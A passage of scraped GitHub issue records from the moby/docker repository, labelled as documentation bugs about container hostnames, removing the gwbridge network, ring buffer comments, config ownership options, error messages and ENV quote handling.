\"-c\"]\r\n\r\nas an alternative to make `set -o pipefail` work on Debian base images. Using the exec form, especially when you have the need to add pipefail to an existing long RUN sequence, is intrusive and would incur a lot of rewriting work."},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n**Description**\r\n\r\nFrom documentation:\r\nhttps://docs.docker.com/config/containers/container-networking/#ip-address-and-hostname\r\n> a container’s hostname defaults to be the container’s name in Docker. You can override the hostname using --hostname\r\n\r\nhttps://docs.docker.com/config/containers/container-networking/#dns-services\r\n> --hostname | The hostname a container uses for itself. Defaults to the container’s name if not specified.\r\n\r\nWhen I omit --hostname, I only get container ID as hostname.\r\nThat is either a bug in functionality or in documentation.\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n```\r\n$ docker run --rm --name test1 jayprakashji/ubuntu-network-tools tail -n1 /etc/hosts\r\n172.17.0.3\t91f7517eec46\r\n\r\n$ docker run --rm --name test1 jayprakashji/ubuntu-network-tools ping -c1 test1\r\nping: unknown host\r\n\r\n\r\n$ docker run --rm --name test1 -h test1 jayprakashji/ubuntu-network-tools tail -n1 /etc/hosts\r\n172.17.0.3\ttest1\r\n\r\n$ docker run --rm --name test1 -h test1 jayprakashji/ubuntu-network-tools ping -c1 test1\r\nPING test1 (172.17.0.3): 56 data bytes\r\n64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.039 ms\r\n--- test1 ping statistics ---\r\n1 packets transmitted, 1 packets received, 0% packet loss\r\nround-trip min/avg/max/stddev = 0.039/0.039/0.039/0.000 ms\r\n```\r\n\r\n**Describe the results you received:**\r\nWithout --hostname (-h), ping is unable to resolve container name.\r\n\r\n**Describe the results you expected:**\r\n\r\nContainer name and hostname are same, so according to mentioned doc, both variants should behave equally.\r\n\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n Version:           18.06.0-ce\r\n API version:       1.38\r\n Go version:        go1.10.3\r\n Git commit:        0ffa825\r\n Built:             Wed Jul 18 19:11:45 2018\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer:\r\n Engine:\r\n  Version:          18.06.0-ce\r\n  API version:      1.38 (minimum version 1.12)\r\n  Go version:       go1.10.3\r\n  Git commit:       0ffa825\r\n  Built:            Wed Jul 18 19:14:07 2018\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 11\r\n Running: 2\r\n Paused: 0\r\n Stopped: 9\r\nImages: 69\r\nServer Version: 18.06.0-ce\r\nStorage Driver: devicemapper\r\n Pool Name: docker-253:1-5768343-pool\r\n Pool Blocksize: 65.54kB\r\n Base Device Size: 10.74GB\r\n Backing Filesystem: xfs\r\n Udev Sync Supported: true\r\n Data file: /dev/loop0\r\n Metadata file: /dev/loop1\r\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\r\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\r\n Data Space Used: 12.52GB\r\n Data Space Total: 107.4GB\r\n Data Space Available: 67.38GB\r\n Metadata Space Used: 22.36MB\r\n Metadata Space Total: 2.147GB\r\n Metadata Space Available: 2.125GB\r\n Thin Pool Minimum Free Space: 10.74GB\r\n Deferred Removal Enabled: true\r\n Deferred Deletion Enabled: true\r\n Deferred Deleted Device Count: 0\r\n Library Version: 1.02.146 (2017-12-18)\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: active\r\n NodeID: g87d69ja2y0wy5i9m8pn5b7ai\r\n Is Manager: true\r\n ClusterID: czn8ge5ue920y81jcg2eunijh\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Autolock Managers: false\r\n Root Rotation In Progress: false\r\n Node Address: 192.168.1.65\r\n Manager Addresses:\r\n  192.168.1.65:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: d64c661f1d51c48782c9cec8fda7604785f93587\r\nrunc version: 69663f0bd4b60df09991c08812a60108003fa340\r\ninit version: fec3683\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.17.7-200.fc28.x86_64\r\nOperating System: Fedora 28 (Workstation Edition)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 15.54GiB\r\nName: jxi15zf\r\nID: PHMZ:56J6:TKPH:NYRZ:3UQ5:ZTAR:BTA6:CDOJ:3DDF:32CW:5OMR:4J5O\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nUsername: jayprakashji\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: devicemapper: usage of loopback devices is strongly discouraged for production use.\r\n         Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nI don't suspect that it matters, but I have active swarm (single node), which I use for running apps as services. (i.e. pma for local DB )"},{"labels":["documentation",null,null],"text":"**Description**\r\n\r\nAttempting to follow the steps at https://success.docker.com/article/how-do-i-change-the-docker-gwbridge-address to remove the docker_gwbridge network fails with message: \"Error response from daemon: network docker_gwbridge id xxxxx has active endpoints\"\r\n\r\n**Steps to reproduce the issue:**\r\n1.  Stop all running containers\r\n2. docker network rm docker_gwbridge\r\n\r\n**Describe the results you received:**\r\n\r\n\"Error response from daemon: network docker_gwbridge id xxxxx has active endpoints\"\r\n\r\n**Describe the results you expected:**\r\n\r\ndocker_gwbridge is successfully removed\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nStopping and starting the docker daemon did not help.  To succeed, I had to use \r\n```\r\ndocker network disconnect --force docker_gwbridge gateway_ingress-sbox\r\n```\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      18.03.1-ce\r\n API version:  1.37\r\n Go version:   go1.9.5\r\n Git commit:   9ee9f40\r\n Built:        Thu Apr 26 07:20:16 2018\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n Orchestrator: swarm\r\n\r\nServer:\r\n Engine:\r\n  Version:      18.03.1-ce\r\n  API version:  1.37 (minimum version 1.12)\r\n  Go version:   go1.9.5\r\n  Git commit:   9ee9f40\r\n  Built:        Thu Apr 26 07:23:58 2018\r\n  OS/Arch:      linux/amd64\r\n  Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 0\r\n Running: 0\r\n Paused: 0\r\n Stopped: 0\r\nImages: 22\r\nServer Version: 18.03.1-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: journald\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: active\r\n NodeID: skgf4dv4ux9h1hx3e72mdbfd8\r\n Is Manager: true\r\n ClusterID: zn70moohy7c4flpt96g4begj7\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Autolock Managers: false\r\n Root Rotation In Progress: false\r\n Node Address: 10.7.53.227\r\n Manager Addresses:\r\n  10.7.53.227:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 773c489c9c1b21a6d78b5c538cd395416ec50f88\r\nrunc version: 4fc53a81fb7c994640722ac585fa9ca548971871\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-693.21.1.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 8\r\nTotal Memory: 31.26GiB\r\nName: docker_host\r\nID: DRLU:OX6M:MHCB:46AZ:ZAHV:XLCW:272G:PUZ4:P62L:UILM:RIVX:6JIR\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nVM running on VMWare ESXI/VCenter 6\r\n\r\nComplete steps for troubleshooting:\r\n\r\n```\r\n[centos@docker_host ~]$ docker ps\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n[centos@docker_host ~]$ docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n[centos@docker_host ~]$ sudo docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n[centos@docker_host ~]$ docker network rm docker_gwbridge\r\nError response from daemon: network docker_gwbridge id 804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c has active endpoints\r\n[centos@docker_host ~]$ docker network inspect docker_gwbridge\r\n[\r\n    {\r\n        \"Name\": \"docker_gwbridge\",\r\n        \"Id\": \"804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c\",\r\n        \"Created\": \"2018-05-01T15:28:49.63617387-07:00\",\r\n        \"Scope\": \"local\",\r\n        \"Driver\": \"bridge\",\r\n        \"EnableIPv6\": false,\r\n        \"IPAM\": {\r\n            \"Driver\": \"default\",\r\n            \"Options\": null,\r\n            \"Config\": [\r\n                {\r\n                    \"Subnet\": \"172.18.0.0/16\",\r\n                    \"Gateway\": \"172.18.0.1\"\r\n                }\r\n            ]\r\n        },\r\n        \"Internal\": false,\r\n        \"Attachable\": false,\r\n        \"Ingress\": false,\r\n        \"ConfigFrom\": {\r\n            \"Network\": \"\"\r\n        },\r\n        \"ConfigOnly\": false,\r\n        \"Containers\": {\r\n            \"ingress-sbox\": {\r\n                \"Name\": \"gateway_ingress-sbox\",\r\n                \"EndpointID\": \"dab9a444acf208de35b164054db597d4c658117a5dba90536c65c6f164fb589d\",\r\n                \"MacAddress\": \"02:42:ac:12:00:02\",\r\n                \"IPv4Address\": \"172.18.0.2/16\",\r\n                \"IPv6Address\": \"\"\r\n            }\r\n        },\r\n        \"Options\": {\r\n            \"com.docker.network.bridge.enable_icc\": \"false\",\r\n            \"com.docker.network.bridge.enable_ip_masquerade\": \"true\",\r\n            \"com.docker.network.bridge.name\": \"docker_gwbridge\"\r\n        },\r\n        \"Labels\": {}\r\n    }\r\n]\r\n[centos@docker_host ~]$ docker system prune\r\nWARNING! This will remove:\r\n        - all stopped containers\r\n        - all networks not used by at least one container\r\n        - all dangling images\r\n        - all build cache\r\nAre you sure you want to continue? [y/N] y\r\nDeleted Containers:\r\n05b07339348a2fc1dd6bac9fbd59e5940b39171d5f96d8ce075bba796e7fdb1e\r\n...\r\n7c06b626377174003790cd32f7f217dd7add6b7fba92c121d3922057addf379a\r\n\r\nDeleted Images:\r\nuntagged: dockersamples/visualizer@sha256:bc680132f772cb44062795c514570db2f0b6f91063bc3afa2386edaaa0ef0b20\r\n...\r\ndeleted: sha256:5bef08742407efd622d243692b79ba0055383bbce12900324f75e56f589aedb0\r\n\r\nTotal reclaimed space: 450MB\r\n[centos@docker_host ~]$ docker network inspect docker_gwbridge\r\n[\r\n    {\r\n        \"Name\": \"docker_gwbridge\",\r\n        \"Id\": \"804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c\",\r\n        \"Created\": \"2018-05-01T15:28:49.63617387-07:00\",\r\n        \"Scope\": \"local\",\r\n        \"Driver\": \"bridge\",\r\n        \"EnableIPv6\": false,\r\n        \"IPAM\": {\r\n            \"Driver\": \"default\",\r\n            \"Options\": null,\r\n            \"Config\": [\r\n                {\r\n                    \"Subnet\": \"172.18.0.0/16\",\r\n                    \"Gateway\": \"172.18.0.1\"\r\n                }\r\n            ]\r\n        },\r\n        \"Internal\": false,\r\n        \"Attachable\": false,\r\n        \"Ingress\": false,\r\n        \"ConfigFrom\": {\r\n            \"Network\": \"\"\r\n        },\r\n        \"ConfigOnly\": false,\r\n        \"Containers\": {\r\n            \"ingress-sbox\": {\r\n                \"Name\": \"gateway_ingress-sbox\",\r\n                \"EndpointID\": \"dab9a444acf208de35b164054db597d4c658117a5dba90536c65c6f164fb589d\",\r\n                \"MacAddress\": \"02:42:ac:12:00:02\",\r\n                \"IPv4Address\": \"172.18.0.2/16\",\r\n                \"IPv6Address\": \"\"\r\n            }\r\n        },\r\n        \"Options\": {\r\n            \"com.docker.network.bridge.enable_icc\": \"false\",\r\n            \"com.docker.network.bridge.enable_ip_masquerade\": \"true\",\r\n            \"com.docker.network.bridge.name\": \"docker_gwbridge\"\r\n        },\r\n        \"Labels\": {}\r\n    }\r\n]\r\n[centos@docker_host ~]$ docker network rm docker_gwbridge\r\nError response from daemon: network docker_gwbridge id 804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c has active endpoints\r\n[centos@docker_host ~]$ docker stop ingress-sbox\r\nError response from daemon: No such container: ingress-sbox\r\n[centos@docker_host ~]$ docker stop gateway_ingress-sbox\r\nError response from daemon: No such container: gateway_ingress-sbox\r\n[centos@docker_host ~]$ docker network disconnect --force docker_gwbridge ingress-sbox\r\nError response from daemon: endpoint ingress-sbox not found\r\n[centos@docker_host ~]$ docker network disconnect --force docker_gwbridge gateway_ingress-sbox\r\n[centos@docker_host ~]$ docker network inspect docker_gwbridge\r\n[\r\n    {\r\n        \"Name\": \"docker_gwbridge\",\r\n        \"Id\": \"804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c\",\r\n        \"Created\": \"2018-05-01T15:28:49.63617387-07:00\",\r\n        \"Scope\": \"local\",\r\n        \"Driver\": \"bridge\",\r\n        \"EnableIPv6\": false,\r\n        \"IPAM\": {\r\n            \"Driver\": \"default\",\r\n            \"Options\": null,\r\n            \"Config\": [\r\n                {\r\n                    \"Subnet\": \"172.18.0.0/16\",\r\n                    \"Gateway\": \"172.18.0.1\"\r\n                }\r\n            ]\r\n        },\r\n        \"Internal\": false,\r\n        \"Attachable\": false,\r\n        \"Ingress\": false,\r\n        \"ConfigFrom\": {\r\n            \"Network\": \"\"\r\n        },\r\n        \"ConfigOnly\": false,\r\n        \"Containers\": {},\r\n        \"Options\": {\r\n            \"com.docker.network.bridge.enable_icc\": \"false\",\r\n            \"com.docker.network.bridge.enable_ip_masquerade\": \"true\",\r\n            \"com.docker.network.bridge.name\": \"docker_gwbridge\"\r\n        },\r\n        \"Labels\": {}\r\n    }\r\n]\r\n[centos@docker_host ~]$ docker network rm docker_gwbridge\r\ndocker_gwbridge\r\n[centos@docker_host ~]$ docker network ls\r\nNETWORK ID          NAME                DRIVER              SCOPE\r\nd9432128aa1c        bridge              bridge              local\r\nacc20ffb4d59        host                host                local\r\nxrad9row46w7        ingress             overlay             swarm\r\nbed9358defe1        none                null                local\r\n\r\n```"},{"labels":["documentation",null,null],"text":"**Description**\r\nThe Enqueue function of ringbuff used for RingLogger located in [ring.go](https://github.com/moby/moby/blob/master/daemon/logger/ring.go#L152-L174) dose not work as it documented that  oldest item will be dropped to make room for new item when buffer is full. Instead, the new item will be dropped. \r\n\r\ncode snippet as shown below\r\n```\r\n// Enqueue adds a message to the buffer queue\r\n// If the message is too big for the buffer it drops the oldest messages to make room\r\n// If there are no messages in the queue and the message is still too big, it adds the message anyway.\r\nfunc (r *messageRing) Enqueue(m *Message) error {\r\n\tmSize := int64(len(m.Line))\r\n\r\n\tr.mu.Lock()\r\n\tif r.closed {\r\n\t\tr.mu.Unlock()\r\n\t\treturn errClosed\r\n\t}\r\n\tif mSize+r.sizeBytes > r.maxBytes && len(r.queue) > 0 {\r\n\t\tr.wait.Signal()\r\n\t\tr.mu.Unlock()\r\n\t\treturn nil\r\n\t}\r\n\r\n\tr.queue = append(r.queue, m)\r\n\tr.sizeBytes += mSize\r\n\tr.wait.Signal()\r\n\tr.mu.Unlock()\r\n\treturn nil\r\n}\r\n```\r\n\r\nA similar misleading comment also appears in the [ring_test.go](https://github.com/moby/moby/blob/master/daemon/logger/ring_test.go#L51-L70) file. the comment said that the queue should have message for \"5\" to \"10\", however, it's \"0\" to \"4\" being tested.\r\n\r\n```\r\nfunc TestRingCap(t *testing.T) {\r\n\tr := newRing(5)\r\n\tfor i := 0; i < 10; i++ {\r\n\t\t// queue messages with \"0\" to \"10\"\r\n\t\t// the \"5\" to \"10\" messages should be dropped since we only allow 5 bytes in the buffer\r\n\t\tif err := r.Enqueue(&Message{Line: []byte(strconv.Itoa(i))}); err != nil {\r\n\t\t\tt.Fatal(err)\r\n\t\t}\r\n\t}\r\n\r\n\t// should have messages in the queue for \"5\" to \"10\"\r\n\tfor i := 0; i < 5; i++ {\r\n\t\tm, err := r.Dequeue()\r\n\t\tif err != nil {\r\n\t\t\tt.Fatal(err)\r\n\t\t}\r\n\t\tif string(m.Line) != strconv.Itoa(i) {\r\n\t\t\tt.Fatalf(\"got unexpected message for iter %d: %s\", i, string(m.Line))\r\n\t\t}\r\n\t}\r\n.......\r\n```\r\n\r\n**Describe the results you expected:**\r\n\r\nEither fix the comment and document to indicated that when buffer is full, new message will be skipped. or fix the code logic to reflect the document"},{"labels":["documentation",null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\nI'm trying to specify user and group ownership of a docker config during creating\r\na docker service in swarm mode. Per [docker config doc](https://docs.docker.com/engine/swarm/configs/), I can use uid/gid or user/group name\r\nas value of `uid=`/`gid=` option. But based on my test, it seems that only uid/gid\r\nis accepted, otherwise the service fails with `starting container failed: strconv.Atoi: parsing \"<user/group-name-here>\": invalid syntax` error.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Take nginx service as an example. Create an empty file `foo.conf` as docker config.\r\n2. Create a service with following command:\r\n```sh\r\ndocker service create -d --config \\\r\n        source=foo.conf,target=/foo.conf,uid=nginx,gid=nginx \\\r\n        --replicas 1 --name nginx \\\r\n    nginx:alpine\r\n```\r\n\r\n**Describe the results you received:**\r\nService failed to start. `docker service ps nginx` shows the following:\r\n```sh\r\n$ docker service ps --no-trunc nginx\r\nID                          NAME                IMAGE                                                                                  NODE                     DESIRED STATE       CURRENT STATE                    ERROR                                                                        PORTS\r\nwz83ikaaul0awr9d4nop44n24   nginx.1             nginx:alpine@sha256:48947591194ac5a9dce1e110f9198a547debb21630f121081640b87d99ca8b11                            Ready               Pending less than a second ago                                                                                \r\n27wfuzre1iz3gwcw644h79k9h    \\_ nginx.1         nginx:alpine@sha256:48947591194ac5a9dce1e110f9198a547debb21630f121081640b87d99ca8b11   <...>                    Shutdown            Failed less than a second ago    \"starting container failed: strconv.Atoi: parsing \"nginx\": invalid syntax\"   \r\nf4zu8squgvk760pefn8ts62jb    \\_ nginx.1         nginx:alpine@sha256:48947591194ac5a9dce1e110f9198a547debb21630f121081640b87d99ca8b11   <...>                    Shutdown            Failed 5 seconds ago             \"starting container failed: strconv.Atoi: parsing \"nginx\": invalid syntax\"   \r\nj9yx5mtk7p0rs7ylnv9kekw6h    \\_ nginx.1         nginx:alpine@sha256:48947591194ac5a9dce1e110f9198a547debb21630f121081640b87d99ca8b11   <...>                    Shutdown            Failed 10 seconds ago            \"starting container failed: strconv.Atoi: parsing \"nginx\": invalid syntax\"\r\n```\r\n\r\n**Describe the results you expected:**\r\nService starts successfully.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nWith uid/gid rather than name, service starts successfully.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nDocker version 18.02.0-ce, build fc4de447b5\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 19\r\n Running: 1\r\n Paused: 0\r\n Stopped: 18\r\nImages: 24\r\nServer Version: 18.02.0-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: xfs\r\n Supports d_type: true\r\n Native Overlay Diff: false\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: active\r\n NodeID: 4m0cef9637sue7o62ujt2ghei\r\n Is Manager: true\r\n ClusterID: l2e2hwgoirkr6v85bxsax1cn8\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Autolock Managers: false\r\n Root Rotation In Progress: false\r\n Node Address: 192.168.99.1\r\n Manager Addresses:\r\n  192.168.99.1:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 9b55aab90508bd389d7654c4baf173a981477d55\r\nrunc version: 9f9c96235cc97674e935002fc3d78361b696a69e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.15.5-1-ARCH\r\nOperating System: Arch Linux\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 8\r\nTotal Memory: 7.712GiB\r\nName: <...>\r\nID: 6L44:BPEL:FEEL:D57Z:UXC5:Z3J3:LGYQ:2E2I:NDRD:EQRE:EA75:ZYBL\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n- OS: Arch Linux       "},{"labels":["documentation"],"text":"\r\n<img width=\"1104\" alt=\"screen shot 2018-02-08 at 3 01 14 pm\" src=\"https://user-images.githubusercontent.com/15134885/35995402-32453670-0ce1-11e8-848b-14d1cc3b1e38.png\">\r\n**Description**\r\n\r\nGodoc is down for client reference\r\n\r\n**Steps to reproduce the issue:**\r\n1. https://godoc.org/github.com/docker/docker/client\r\n2. view the empty chasm that is a 404 error\r\n\r\nOther packages are listed fine on Godoc currently and I was able to view the docs just the other day perfectly fine, so I am guessing that something changed in the commits merged into `master` today...\r\n\r\n"},{"labels":["documentation",null,null],"text":"As a knowledgeable-but-not-expert user, I recently got this message:\r\n\r\n> ERROR: for containername  Cannot create container for service containername: privileged mode is incompatible with user namespaces.  You must run the container in the host namespace when running privileged mode\r\n\r\nMy first reaction was [\"what the **** does this mean?\"](https://media.giphy.com/media/kF0ClnIcSBiDe/giphy.gif).\r\n\r\nThis ticket documents how an average user (senior-ish software engineer, uses docker at work and at home) solved this problem using this error message and Google.\r\n\r\nI take full responsibility for my incompetence, but there are many more of my kind, and the humane thing to do is to guide them towards a solution. **We need a better error message.** I hope that ticket makes a strong case for a better error message and better documentation to support it.\r\n\r\n## Context\r\n\r\nI updated docker recently. Then things something stopped working, and this error message was the only hint I got. I don't understand any of the concept it mentions, or which steps to take in order to fix my problem.\r\n\r\n## Fixing the issue\r\n\r\nWhen you are knee-deep in complex issues all day, you can easily forget how the average user sees things, so I wrote down my thought process down while I fixed the issue so you could understand my perspective as an end user.\r\n\r\n1. What the f- does this mean? This worked yesterday! (at this point, I'm already 3 levels deep on a completely different issue)\r\n2. What's privileged mode? What are user name spaces?\r\n3. What does \"running the container in the host namespace\" mean? *What am I supposed to do?*\r\n4. Maybe if I try to run it without sudo... nope.\r\n5. *Googles the error message*\r\n6. \"Introduction to User Namespaces in Docker Engine\" ([link](https://success.docker.com/article/Introduction_to_User_Namespaces_in_Docker_Engine))\r\n7. \"A namespace wraps a global system resource in an abstraction that makes it appear to the processes within...\". Nope, can't understand any of that.\r\n8. I'm halfway through that page, and I'm still no closer to a useful explanation. What is this? What does any of this even mean? Why doesn't it work anymore?\r\n9. *Googles the error message again*\r\n10. Okay, so according to [this article](https://luppeng.wordpress.com/2016/07/04/docker-user-namespaces/), it seems to be a way to prevent a docker root user to do nasty stuff on the host machine. Why didn't they tell me that in step 6?\r\n11. \"--userns-remap=default\" can allegedly fix this. Nope, can't just add it to `docker-compose up`.\r\n12. `userns_mode: \"host\"` apparently disables that. All I need to do is bump the docker-compose version to 2.1\r\n13. \"2.1\" is not a valid version, for some reason that is completely unexplained by this generic error message. I'm using the latest version of docker and docker-compose, which is why I'm getting the errors above in the first place\r\n14. (at this point, I should state that I am slowly losing my cool)\r\n14. Oh, it seems like this feature was added in a version that's not available on the docker PPA. Time to update docker-compose to an unreleased version to fix a problem in a released version. [This page](https://github.com/docker/compose/releases) helped me.\r\n15. \"docker-compose version 1.19.0-rc3\". Sweet, it's working!\r\n16. Aaaaand it works. I don't know why it works, but it works, and that's enough for one day.\r\n\r\nAll of this, including creating the ticket and finding the Office Space gif took me about 1.5 hours. I believe a more appropriate error message and documentation page could have reduced that to a few minutes. I apologize for the odd format of this ticket, but I hope it's still helpful."},{"labels":[null,"documentation",null],"text":"**Description**\r\n\r\nWhen using `ENV` in the form `ENV <key> <value>` both single and double quotes are being\r\nstripped from `<value>`.\r\n\r\nAccording to [the documentation](https://docs.docker.com/engine/reference/builder/#env):\r\n\r\n> The `ENV` instruction has two forms. The first form, `ENV <key> <value>`, will set a single variable to a value. The entire string after the first space will be treated as the `<value>` - including characters such as spaces and quotes.\r\n\r\nI'm seeing double and single quotes being stripped from entries such as these:\r\n\r\n```\r\nENV DQUOTE One \"two two\" three four\r\nENV SQUOTE One 'two two' three four\r\n```\r\n\r\nBackslashes are also being interpreted:\r\n\r\n```\r\nENV SBACKSLASH One two\\ two three four\r\nENV DBACKSLASH One two\\\\ two three four\r\n```\r\n\r\n**Steps to reproduce the issue:**\r\n\r\n1. `git clone git@github.com:gentlemanautomaton/docker-env-quote-test.git`\r\n2. `cd docker-env-quote-test`\r\n3. `docker build -t gentlemanautomaton/docker-env-quote-test:latest .`\r\n4. `docker inspect gentlemanautomaton/docker-env-quote-test:latest`\r\n\r\n**Describe the results you received:**\r\n\r\n```\r\n\"Env\": 